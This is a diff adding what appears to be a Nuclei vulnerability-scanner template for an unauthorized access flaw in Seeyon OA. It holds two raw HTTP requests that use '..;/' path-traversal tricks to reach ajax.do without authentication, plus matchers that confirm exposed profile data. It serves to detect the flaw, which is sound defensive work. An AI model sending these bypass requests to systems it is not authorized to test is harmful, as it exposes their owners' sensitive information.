@@ -1,0 +1,43 @@
+id: seeyon-ajax-unauthorized-access
+info:
+  name: Seeyon Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: access-control
+  description: |
+    Seeyon unauthorized access vulnerability allows attackers to access sensitive information or functionalities without proper authorization.
+http:
+  - raw:
+      - |
+        GET /seeyon/thirdpartyController.do.css/..;/ajax.do HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "java.lang.NullPointerException:null"
+        part: body
+  - raw:
+      - |
+        GET /seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "MMOneProfile"
+          - "productTags"
+          - "serverIdentifier"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
